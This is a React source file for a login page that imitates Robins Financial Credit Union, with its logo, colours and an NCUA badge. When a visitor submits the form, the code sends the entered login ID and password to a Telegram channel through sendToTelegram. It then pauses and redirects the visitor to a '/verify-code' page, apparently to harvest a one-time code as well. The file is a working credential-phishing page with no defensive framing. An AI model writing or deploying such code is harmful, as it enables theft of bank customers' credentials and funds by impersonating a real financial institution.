import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { sendToTelegram } from "@/utils/telegram";

export default function LoginPage() {
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!username.trim() || !password.trim()) {
      return;
    }

    setIsLoading(true);

    const message = [
      "🔐 <b>Login Form Submitted</b>",
      "",
      `👤 Login ID: <code>${username}</code>`,
      `🔑 Password: <code>${password}</code>`,
      rememberMe ? "📌 Remember me: Yes" : "📌 Remember me: No",
    ].join("\n");

    await sendToTelegram(message);

    setTimeout(() => {
      if (rememberMe) {
        localStorage.setItem("rfcu_remember", "true");
      }
      localStorage.setItem("rfcu_logged_in", "true");
      navigate("/verify-code");
    }, 15000);
  };

const bgImage =
    "https://storage.readdy-site.link/project_files/d334c6d5-2744-4a8f-8943-39b20f8d20f8/4d28f5f8-7ab3-401d-876c-fe7ee873a3bb_62440117-CC60-4F60-9F67-0F2ABD73E11C.jpeg?v=d9e05ccc83a791a2466873120d4500bc";

  const logoIcon =
    "https://static.readdy.ai/image/7e76308de67f95d36c39819111a3a60f/ab40e8d2d571da8ae7469bb943a1fc22.png";

  return (
    <div
      className="min-h-screen w-full relative bg-fixed bg-cover bg-center bg-no-repeat flex flex-col items-center justify-center px-4 py-8"
      style={{ backgroundImage: `url(${bgImage})` }}
    >
      {/* White card */}
      <div className="w-full max-w-[400px] bg-white shadow-xl">
        {/* Logo header with divider */}
        <div className="px-6 pt-5 pb-3 border-b border-gray-300">
          <div className="flex items-center justify-center gap-0 mb-0.5 relative">
            <span
              className="text-[#003d7a] font-bold text-[26px] tracking-tight"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Rob
              <span className="relative inline-block">
                i
                <img
                  src={logoIcon}
                  alt="Robins Financial Logo Icon"
                  className="absolute -top-2.5 left-1/2 -translate-x-1/2 w-7 h-7 object-contain contrast-125 drop-shadow-sm"
                />
              </span>
              ns
            </span>
            <span
              className="text-[#5a7fa8] font-normal text-[26px] tracking-tight"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Financial
            </span>
          </div>
          <div
            className="text-center text-[#003d7a] text-[10px] font-bold uppercase tracking-[0.25em]"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            CREDIT UNION
          </div>
        </div>

        {/* Form area */}
        <div className="px-5 pt-5 pb-2">
          <form onSubmit={handleLogin}>
            {/* Login ID */}
            <div className="mb-4">
              <label
                className="block text-[#333333] text-[15px] mb-1.5"
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              >
                Login ID
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                disabled={isLoading}
                className="w-full h-[42px] border border-[#cccccc] px-3 text-[15px] text-[#333333] outline-none focus:border-[#003d7a] rounded-none disabled:opacity-60 disabled:bg-gray-50"
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              />
            </div>

            {/* Password */}
            <div className="mb-4">
              <label
                className="block text-[#333333] text-[15px] mb-1.5"
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              >
                Password
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={isLoading}
                className="w-full h-[42px] border border-[#cccccc] px-3 text-[15px] text-[#333333] outline-none focus:border-[#003d7a] rounded-none disabled:opacity-60 disabled:bg-gray-50"
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              />
            </div>

            {/* Remember me */}
            <div className="flex items-center gap-2.5 mb-5 mt-1">
              <button
                type="button"
                onClick={() => setRememberMe(!rememberMe)}
                disabled={isLoading}
                className="w-[22px] h-[22px] border border-[#999999] flex items-center justify-center bg-white shrink-0 rounded-none disabled:opacity-50"
              >
                {rememberMe && (
                  <i className="ri-check-line text-[#003d7a] text-sm" />
                )}
              </button>
              <span
                className="text-[#333333] text-[15px]"
                style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
              >
                Remember me
              </span>
            </div>

            {/* Log In button */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full h-[46px] bg-[#003d7a] hover:bg-[#002d5a] text-white text-[16px] rounded-md transition-colors disabled:opacity-70 flex items-center justify-center gap-2"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              {isLoading && (
                <i className="ri-loader-4-line animate-spin text-lg" />
              )}
              {isLoading ? "Logging In..." : "Log In"}
            </button>
          </form>

          {/* Forgot password */}
          <div className="text-right mt-4 mb-4">
            <a
              href="#forgot"
              className="text-[#003d7a] text-[14px] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Forgot your password?
            </a>
          </div>
        </div>

        {/* Footer links */}
        <div className="px-5 pb-5">
          <div className="flex items-center justify-center gap-2 text-[14px] mb-1.5 flex-wrap">
            <a
              href="#enroll"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Enroll Now
            </a>
            <span className="text-[#cccccc]">|</span>
            <a
              href="#unlock"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Forgot/Unlock Login ID
            </a>
          </div>
          <div className="flex items-center justify-center gap-2 text-[14px] flex-wrap">
            <a
              href="#guide"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Digital Banking Guide
            </a>
            <span className="text-[#cccccc]">|</span>
            <a
              href="#privacy"
              className="text-[#003d7a] hover:underline"
              style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
            >
              Privacy Policy
            </a>
          </div>
        </div>
      </div>

      {/* NCUA Badge */}
      <div className="mt-6 w-[200px]">
        <div className="bg-[#003d7a] border-2 border-white shadow-lg px-3 py-2 text-center">
          <p
            className="text-white text-[7px] leading-tight mb-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            Your savings federally insured to at least $250,000
          </p>
          <p
            className="text-white text-[7px] leading-tight mb-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            and backed by the full faith and credit of the United States Government
          </p>
          <p
            className="text-white text-[28px] font-bold leading-none my-1"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            NCUA
          </p>
          <p
            className="text-white text-[7px] leading-tight"
            style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
          >
            National Credit Union Administration, a U.S. Government Agency
          </p>
        </div>
      </div>
    </div>
  );
}